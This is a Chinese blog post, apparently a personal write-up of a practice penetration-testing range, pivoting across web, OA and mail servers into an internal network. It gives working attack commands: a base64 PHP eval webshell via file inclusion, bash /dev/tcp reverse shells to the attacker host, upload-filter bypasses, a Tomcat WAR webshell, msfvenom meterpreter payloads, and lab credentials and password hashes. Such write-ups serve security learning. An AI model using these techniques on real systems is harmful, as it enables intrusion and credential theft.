@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CKMT2J522R"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-CKMT2J522R', { 'anonymize_ip': false });
+}
+</script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  记一次自摸的综合靶场 &ndash; 春田花花幼稚园
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="超长文慎点。靶场说大不大，就是搞了三天，一是网速，二是网速，三是网速的原因，还有就是经验的原因。至今未完，70分。
+|blog under go1f.github.io">
+    
+
+    <meta name="apple-mobile-web-app-title" content="春田花花幼稚园">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@">
+    <meta name="twitter:title" content="记一次自摸的综合靶场 | 春田花花幼稚园">
+    <meta name="twitter:description" content="超长文慎点。靶场说大不大，就是搞了三天，一是网速，二是网速，三是网速的原因，还有就是经验的原因。至今未完，70分。|blog under go1f.github.io">
+    <meta name="twitter:image" content="/twitter-card.png">
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="/">
+    春田花花幼稚园
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/whisper/">
+      
+      <span>离骚</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/tech/">
+      
+      <span>拙技</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/glance/">
+      
+      <span>速览</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">记一次自摸的综合靶场</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2023-04-30. Published at: 2020-02-29.">
+        
+          Lastmod: 2023-04-30
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>超长文慎点。靶场说大不大，就是搞了三天，一是网速，二是网速，三是网速的原因，还有就是经验的原因。至今未完，70分。</p>
+<p>​</p>
+<p><img src="https://i.loli.net/2020/03/04/y64OelnGXBIN1xH.png" alt="拓扑.png"></p>
+<h2 id="web服务">WEB服务</h2>
+<p>当前攻击机Kali，在192.168.11.0/24网段，有一台192.168.11.4的网站服务器。</p>
+<p><img src="https://i.loli.net/2020/02/29/ZqzeSdu4EpLDiGR.png" alt="11_4_Web_index.png"></p>
+<p>​</p>
+<p>浏览中，发现地址栏明显的标志 http://<code>http://192.168.11.3/index.php?page=about.php</code>，文件包含无疑。</p>
+<p><img src="https://i.loli.net/2020/02/29/UznxjBNeaCoc9JG.png" alt="11_4_Web_file_include.png"></p>
+<p>​</p>
+<p>遂，攻击机制作一句话木马；其实还可以地址栏直接输入：</p>
+<pre tabindex="0"><code class="language-url" data-lang="url">http://192.168.11.3/index.php?page=data:text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbYV0pOyAgPz4=
+</code></pre><p><img src="https://i.loli.net/2020/02/29/xieQSuksMVYO4LT.png" alt="payload_on_11_3.png"></p>
+<p>成功验证，getwebshell。</p>
+<p><img src="https://i.loli.net/2020/02/29/mDfBFHAWrPyjRS1.png" alt="11_4_Web_file_include_get_webshell.png"></p>
+<p>​</p>
+<p>得到flag1</p>
+<p><img src="https://i.loli.net/2020/02/29/odsFB8z6qDH5lgQ.png" alt="11_4_Web_get_flag1.png"></p>
+<p>​</p>
+<p>先反弹靶机的shell，蚁剑-虚拟终端输入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.11.2/8000 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></div><p>攻击机接收shell：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -lvvp <span class="m">8000</span>
+</span></span></code></pre></div><p><img src="https://i.loli.net/2020/02/29/O4ZYtXmHPSe15CF.png" alt="11_4_reverse_shell.png"></p>
+<p>​</p>
+<p>提权，遇坑（模拟终端的shell是一次性的，Exp提权请先反弹shell）。没事，接着，上传文件到有读写执行权限的位置，<code>/var/www/html/upload</code> 、<code>/tmp</code> 等。</p>
+<p><img src="https://i.loli.net/2020/02/29/JIbFglPpOznrNXK.png" alt="11_4_upload_exp.png"></p>
+<p>根据 <code>phpinfo()</code> 或 <code>uname -a</code> 获知linux内核版本，上传对应可用 Exp 提权。</p>
+<p><img src="https://i.loli.net/2020/02/29/pZLyY9lJ6qK7hSH.png" alt="11_4_upgrade_privilge.png"></p>
+<p>获得flag2</p>
+<p><img src="https://i.loli.net/2020/02/29/8fRVY1NiK2aEOr9.png" alt="11_4_Web_get_flag2.png"></p>
+<p>​</p>
+<p>后续渗透，查看主机的网卡，多网卡就是边界机/跳板。</p>
+<p><img src="https://i.loli.net/2020/02/29/JycihFdkmo3se5T.png" alt="11_4_Web_eth0_172_16_12_0_24.png"></p>
+<p>​</p>
+<h2 id="oa服务">OA服务</h2>
+<p>向新发现网段 <code>172.16.12.0/24</code>，继续进发，此时搭建一个代理再去做网段扫描。</p>
+<p>先配置Socks代理到攻击机，此处可以使用 reGeorgSocksProxy配套工具</p>
+<ol>
+<li>
+<p>上传tunnel.php脚本到靶机 <code>192.167.11.3</code> 网站目录上</p>
+</li>
+<li>
+<p>攻击机开启Sock5代理，绑定到1080端口</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python reGeorgSocksProxy.py -u http://192.168.11.3/upload/tunnel.php -p <span class="m">1080</span>
+</span></span></code></pre></div></li>
+</ol>
+<p>但这里是使用了EarthWorm做Socks5</p>
+<pre tabindex="0"><code>./ew -s ssocked -l 1080
+</code></pre><p>接着，配置proxychains，添加记录 <code>socks5 192.168.11.3 1080</code></p>
+<p>对 <code>172.16.12.0/24</code> 网段扫描，注意，Socks协议在会话层，ICMP协议在网络层，所以nmap配置不要ping扫描存活主机，这里使用TCP扫描。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nmap -sT -Pn -n 172.16.12.0/24
+</span></span></code></pre></div><p>​</p>
+<p>发现 <code>172.16.12.103</code> 、 <code>172.16.12.104</code> 主机，一个是OA系统，一个是邮箱系统。先对OA系统进行渗透。</p>
+<p>F12 观察数据包，发现 <code>message.php?id=1</code> 有可疑</p>
+<p><img src="https://i.loli.net/2020/02/29/HESxDndYB6mOKMq.png" alt="12_103_oa_sql_inject_find.png"></p>
+<p>​</p>
+<p>单引号、逻辑判断等常规测试后，确认是数字型UNION注入</p>
+<p><img src="https://i.loli.net/2020/02/29/XZBxswKijRJr1UD.png" alt="12_103_oa_sql_inject_union.png"></p>
+<p>​</p>
+<p>使用sqlmap，dump所有的表。获得flag3</p>
+<p>还有一个admin账户密码，md5解密，竟然要收费，灵机一动，直接google这个md5。</p>
+<p>ok，有博客分享出来了，MD5 =&gt;29acd667cdbee1116d365727ca6821d3，明文=&gt;37s984pass，没看出特殊含义，能解出来就好吧。</p>
+<p><img src="https://i.loli.net/2020/02/29/lqd2hu9AsYxk13B.png" alt="12_103_oa_flag3.png"></p>
+<p>​</p>
+<p>有管理员表，多数有后台页面，是的，就在admin目录。</p>
+<p>登录进去，发现有上传点，尝试直接上传一句话。</p>
+<p><img src="https://i.loli.net/2020/02/29/nY3oPbEyzdTCaGQ.png" alt="12_103_oa_admin_file_upload.png"></p>
+<p>​</p>
+<p>成功上传，Webshell get it.</p>
+<p><img src="https://i.loli.net/2020/02/29/jCgPbrLNXIykhGW.png" alt="12_103_oa_get_webshell.png"></p>
+<p>​</p>
+<p>连接蚁剑，记得先添加代理。</p>
+<p><img src="https://i.loli.net/2020/02/29/wWsFn1XEANHQRgZ.png" alt="12_103_oa_get_webshell_antsword.png"></p>
+<p>​</p>
+<p>得到flag4</p>
+<p><img src="https://i.loli.net/2020/02/29/fkQ3UxHJlLC5Z1S.png" alt="12_103_oa_flag4.png"></p>
+<p>​</p>
+<p>然后查看网页配置文件，发现数据库账号密码（其实已经没有大作用，先前已经扫荡过了），主要是发现一个邮箱账号密码，与后续的邮件网站有关。</p>
+<p><img src="https://i.loli.net/2020/02/29/iJNI7QnmcRwg6jV.png" alt="12_103_oa_sql_infor.png"></p>
+<p>​</p>
+<h2 id="邮件服务">邮件服务</h2>
+<p>顺利利用邮箱账户=&gt; <code>zhangming@test.com</code>   密码=&gt; <code>fgpass2814</code>登录。</p>
+<p>花了不少时间发现的漏洞，Cookie的id值与个人信息挂钩。</p>
+<p><img src="https://i.loli.net/2020/02/29/5PslWjTbhQKNAxa.png" alt="12_104_mail_cookie_injection.png"></p>
+<p>​</p>
+<p>Burpsuit Repeat，确认注入。</p>
+<p><img src="https://i.loli.net/2020/02/29/XIiRyzrCabk4ouQ.png" alt="12_104_mail_cookie_injection_confirm.png"></p>
+<p>​</p>
+<p>Sqlmap进一步利用</p>
+<p><img src="https://i.loli.net/2020/02/29/Y9PgDr3mzB5xisy.png" alt="12_104_mail_cookie_injection_sqlmap.png"></p>
+<p>​</p>
+<p>同理，找到admin表 MD5=&gt;22f2e5ec0bf4b85554c755993e2ba67f ，明文=&gt;2_333admin，疑惑的是，没看到有flag。</p>
+<p>接着找管理后台路径，例如 admin/Admin/User/System/Manage等，ok，找到的是manage目录。</p>
+<p>这里同样，有文件上传功能。</p>
+<p><img src="https://i.loli.net/2020/02/29/PNJVRizWSe3bE9I.png" alt="12_104_mail_manage_file_upload.png"></p>
+<p>​</p>
+<p>一开始，发现有图片内容检测，合成图片马。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat a.png a.php &gt; shell.php
+</span></span></code></pre></div><p>php后缀上传不了有点懵（php后缀名没绕过，但却以为是白名单过滤，截断、小数点结尾都尝试了）。等反应过来，上传随意后缀成功了才发现，其实是黑名单机制，遂使用php5绕过。</p>
+<p><img src="https://i.loli.net/2020/02/29/paOVvKhWtf5RoPz.png" alt="12_104_mail_manage_file_upload_php5.png"></p>
+<p>小结：确定好文件上传测试流程！</p>
+<p>​</p>
+<p>Webshell get it.</p>
+<p><img src="https://i.loli.net/2020/02/29/C7PsHYwVXTFgDlE.png" alt="12_104_mail_manage_get_webshell.png"></p>
+<p>​</p>
+<p>问题：邮箱是关键，关键flag5在哪？？</p>
+<p>连接蚁剑，在网站目录找到flag6</p>
+<p>数据库账户 MyDB(&ldquo;127.0.0.1&rdquo;,&ldquo;mail&rdquo;,&ldquo;mail123456&rdquo;,&ldquo;my_mail&rdquo;);</p>
+<p>​</p>
+<p>接着提权，本来打算上传Ubuntu3.16有效的Exp到 upload目录执行，但是提示 <code>no such file or directory</code>，搜索一下问题，大概就是Exp的架构跟Linux架构位数不一样或者其他问题。</p>
+<p>偶然间，浏览的/var目录，发现tomcat，这听闻是高权限应用！头次遇上了！</p>
+<p><img src="https://i.loli.net/2020/03/01/ix3baBnoLVTHsN6.png" alt="12_104_mail_tomcat_found.png"></p>
+<p>查看netstat，感觉Web服务部署在8080端口</p>
+<p><img src="https://i.loli.net/2020/03/01/3lRcP6DvFOEw1XZ.png" alt="12_104_mail_tomcat_port.png"></p>
+<p>​</p>
+<p>之后马上学习tomcat的目录结构。主要用到这两个目录：conf(Tomcat配置文件)、 webapps(Tomcat的主要Web发布目录，存放JSP,SERVLET,类）。</p>
+<p>看到 <code>webapps/manager</code> 目录，尝试访问，需要登录认证，但有提示，账户密码可以在conf/web-user.xml查看。</p>
+<p><img src="https://i.loli.net/2020/03/01/1sxX7Fcil9OHkPh.png" alt="12_104_mail_tomcat_conf_tomcat_user.png"></p>
+<p>这应该是默认配置：tomcat/tomcat。</p>
+<p><img src="https://i.loli.net/2020/03/01/j3HeFidsW24OTQr.png" alt="12_104_mail_tomcat_conf_tomcat_user_password.png"></p>
+<p>​</p>
+<p>成功登录，进入后台。</p>
+<p>可以看到该网站下发布的应用。看到上传应用接口，制作一句话的war包</p>
+<p><img src="https://i.loli.net/2020/03/01/LIOvAdb6fmUeE43.png" alt="12_104_mail_tomcat_jar_war.png"></p>
+<p>后来用了Cknife的1.jsp又打包了一个shell.war。上传成功后，得到一句话的地址</p>
+<p><img src="https://i.loli.net/2020/03/01/NxV4uEryLwRqdf6.png" alt="12_104_mail_tomcat_upload_war.png"></p>
+<p>​</p>
+<p>连接Cknife，因为我的刀版本低，不支持代理，所以 JVM运行时配置Socks代理，选项会默认端口1080</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">java -DsocksProxyHost<span class="o">=</span>192.168.11.3 -jar Cknife.jar
+</span></span></code></pre></div><p>​</p>
+<p>cat /root/flag 得到 flag7</p>
+<p><img src="https://i.loli.net/2020/03/01/crv6ypHuQVZwKqX.png" alt="12_104_mail_tomcat_shell_flag7.png"></p>
+<p>现在就可以反弹出一个root权限的shell，反弹到WEB服务器<code>172.16.12.102</code>。ubuntu低版本sh对bash有点兼容问题，搜了一下，将bash反弹语句作了改进。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">bash -c <span class="s1">&#39;bash -i 1&gt;&amp;/dev/tcp/172.16.12.102/8104 0&gt;&amp;1&#39;</span>
+</span></span></code></pre></div><p>还发现了新网段 <code>10.15.0.0/24</code></p>
+<p><img src="https://i.loli.net/2020/02/29/EQ1eJRFhpObgcYf.png" alt="12_104_mail_multi_eth1.png"></p>
+<p>​</p>
+<p>代理必须的！</p>
+<p>于是我开始了一系列坚强不屈的操作，硬是含泪地把mail服务器Socks代理了出来。</p>
+<p><img src="https://i.loli.net/2020/03/01/O7o5qG6dFYlyDtb.png" alt="12_104_mail_proxy_socks.png"></p>
+<p>​</p>
+<p>但是，</p>
+<h2 id="后知后觉">后知后觉</h2>
+<p>在多次因误操作断开了反弹shell后，忽然醒觉，为什么不早点用MSF？？补救……</p>
+<p>制作反弹木马，上传到WEB服务器，在之前的反弹shell里执行(希望最后一次用反弹的shell)，kali获得反弹的meterpreter</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">msfvenom -l payload <span class="p">|</span>grep meterpreter <span class="p">|</span>grep linux<span class="p">|</span>grep x64
+</span></span><span class="line"><span class="cl">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.11.2 <span class="nv">lport</span><span class="o">=</span><span class="m">7000</span> -f elf -o r7000
+</span></span></code></pre></div><p><img src="https://i.loli.net/2020/03/01/kAaOhpRoDKzJdU5.png" alt="msfvenom_l_payload_meterpreter_x64_linux.png"></p>
+<p>​</p>
+<p>msf 设置payload，等待连接</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">use exploit/multi/handler
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload linux/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> lhost 192.168.11.2
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> lport <span class="m">7000</span>
+</span></span><span class="line"><span class="cl">exploit -z -j
+</span></span></code></pre></div><p><img src="https://i.loli.net/2020/03/01/zxyPe6TJLGgbZWV.png" alt="msf_meterpreter_reverse_tcp_on_web_and_route_add.png"></p>
+<p>成功后，进入web服务器的meterpreter，添加路由</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">run autoroute -s 172.16.12.0/24
+</span></span><span class="line"><span class="cl">run autoroute -p
+</span></span></code></pre></div><p>添加了路由，就可据WEB服务器的路由规则访问mail服务器。</p>
+<p>再对mail服务器制作bind_tcp（因为现在可以主动连接它啊！这个觉悟又是半天，之前先入为主固化了思维，只想着反弹）木马</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">msfvenom -p linux/x64/meterpreter/bind_tcp <span class="nv">lport</span><span class="o">=</span><span class="m">7000</span> -f elf -o b7000
+</span></span></code></pre></div><p>Cknife上传，执行b7000，即在mail服务器上开启监听。</p>
+<p>​</p>
+<p>msf 主动连接</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">set</span> payload linux/x64/meterpreter/bind_tcp
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> rhost 172.16.12.104
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> rport <span class="m">7000</span>
+</span></span><span class="line"><span class="cl">exploit -z -j
+</span></span></code></pre></div><p><img src="https://i.loli.net/2020/03/01/JInuhe6gXcmHdZa.png" alt="msf_meterpreter_bind_tcp_7000_on_mail.png"></p>
+<p>成功收到meterpreter session，再进入session 添加 <code>10.15.0.0/24</code> 的路由</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">run autoroute -s 10.15.0.0/24
+</span></span><span class="line"><span class="cl">run autoroute -p
+</span></span></code></pre></div><p><img src="https://i.loli.net/2020/03/01/op2C4LWGmPiBjK6.png" alt="msf_route_autoroute.png"></p>
+<p>坐拥两个路由，暂时在MSF内对内网下畅行无阻。但我想kali其它应用也可以用上，于是添加socks4代理，默认绑定在本地 <code>0.0.0.0:1080</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">use auxiliary/server/socks4a
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></div><p><img src="https://i.loli.net/2020/03/01/4TPMk2NQf1J8CxD.png" alt="msf_auxiliary_server_socks4a.png"></p>
+<p>​</p>
+<p>配置好proxychains，添加 <code>socks4 127.0.0.1 1080</code> 。这时，该对新网段做一次存活主机扫描了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains nmap -sT -sV -Pn -O -n 10.15.0.0/24
+</span></span></code></pre></div><p>30min后……</p>
+<p>我Ctrl+C了，因为它告诉我，完成了5%</p>
+<p>我只好根据mail主机上的arp记录，先确定了10.15.0.1、10.15.0.3 两台主机</p>
+<p>​</p>
+<p>卡死。后会有期。</p>
+<p>​</p>
+<h2 id="继续渗透">继续渗透</h2>
+<p>大家好，我已经没什么心机了。但却也更轻车熟路地，重复还原到这一步，再Fuzz。</p>
+<p>flag8</p>
+<p>发现10.15.0.4的远程桌面登录，使用admin\2_333admin登录成功。</p>
+<p>提权，查看管理员桌面，获得flag9</p>
+<p>flag9</p>
+<p>获得10.15.0.4的meterpreter，hashdump，有一管理员Hash</p>
+<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:fbe6ba371645ed310bc9fac913c75cd6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
+<p>未完待续。</p>
+<h2 id="补充小结">补充小结</h2>
+<p><strong>kill &amp; ps &amp; netstat -anotp</strong></p>
+<p>为什么学会了kill，因为反弹shell、ew等等进程反复开开关关太多次了</p>
+<ul>
+<li>法子1：通过jobs命令查看job号（假设为num），然后执行kill %num</li>
+<li>法子2：通过ps命令查看job的进程号（PID，假设为pid），然后执行kill pid</li>
+</ul>
+<p>​</p>
+<p><strong>ping次数</strong></p>
+<p><code>ping -c 4 192.168.16.6</code></p>
+<p>​</p>
+<p><strong>x86_64 ?</strong></p>
+<p>蘋果公司和RPM套件管理員以「x86-64」或「<strong>x86_64</strong>」稱呼此64位架構。 甲骨文公司及Microsoft稱之為「x64」。 BSD家族及其他Linux發行版則使用「amd64」，32位元版本則稱為「i386」（或i486/586/686），Arch Linux用<strong>x86_64</strong>稱呼此64位元架構。</p>
+<p>​</p>
+<p><strong>nmap &amp; proxychains</strong></p>
+<p>nmap扫描前，默认先ping扫描确认存活主机，而socks代理不支持icmp协议代理的，所以 <code>-Pn</code> 停用ping扫描，<code>-n</code> 表示直接使用IP地址，不进行DNS查询，<code>-sV</code> 查询软件版本 <code>-O</code> 查询系统型号，<a href="https://www.freebuf.com/news/141607.html">nmap使用指南</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">proxychains nmap -sT -sV -Pn -n 10.15.0.0/24
+</span></span></code></pre></div><p>​</p>
+<p><strong>nc</strong></p>
+<p>在没会用这个之前，研究起了Linux必备的nc，逐个逐个IP去扫</p>
+<pre tabindex="0"><code>nc -znv x.x.x.x 1-1024 2&gt;&amp;1 | grep succeeded　　
+</code></pre><p><code>-v</code> 选项产生的输出位于【stderr】，所以 <code>2&gt;&amp;1</code> 把【stderr】合并到【stdout】</p>
+<p>其实我也没这么有耐心，写了个for循环脚本。其实也没什么用。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">for</span> i in <span class="o">{</span>1..255<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">	nc -znv 10.15.0.<span class="nv">$i</span> 1-1000 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>grep succ
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><p>​</p>
+<p><strong>msfdb</strong></p>
+<p>开启msfconsole后，用到 db_nmap，需要数据库支持，但并不想退出msfconsole</p>
+<p>不知道msf 默认数据库账号，就直接新建数据库用户和数据库并连接</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@kali:~# su postgres 
+</span></span><span class="line"><span class="cl">postgres@kali:/root$ createuser msf4 -P
+</span></span><span class="line"><span class="cl">为新角色输入的口令: 
+</span></span><span class="line"><span class="cl">再输入一遍: 
+</span></span><span class="line"><span class="cl">postgres@kali:/root$ createdb --owner<span class="o">=</span>msf4 msf4
+</span></span><span class="line"><span class="cl">postgres@kali:/root$ exitsh
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">msf &gt; db_connect msf4:pass@127.0.0.1/msf4
+</span></span><span class="line"><span class="cl">msf &gt; db_status 
+</span></span></code></pre></div><p>​</p>
+<p><strong>参考阅读</strong></p>
+<p><a href="https://www.freebuf.com/sectool/56432.html">Metasploit渗透技巧：后渗透Meterpreter代理</a></p>
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>记一次自摸的综合靶场</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web服务">WEB服务</a></li>
+    <li><a href="#oa服务">OA服务</a></li>
+    <li><a href="#邮件服务">邮件服务</a></li>
+    <li><a href="#后知后觉">后知后觉</a></li>
+    <li><a href="#继续渗透">继续渗透</a></li>
+    <li><a href="#补充小结">补充小结</a></li>
+  </ul>
+</nav></div>
+  
+
+  
+    
+    
+      <div>
+        
+
+        
+
+        
+
+        
+          <a data-pocket-label="pocket" data-pocket-count="none" class="pocket-btn" data-lang="en"></a>
+          <script type="text/javascript">!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>
+        
+
+      </div>
+    
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    © jyufu 2020-2023 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
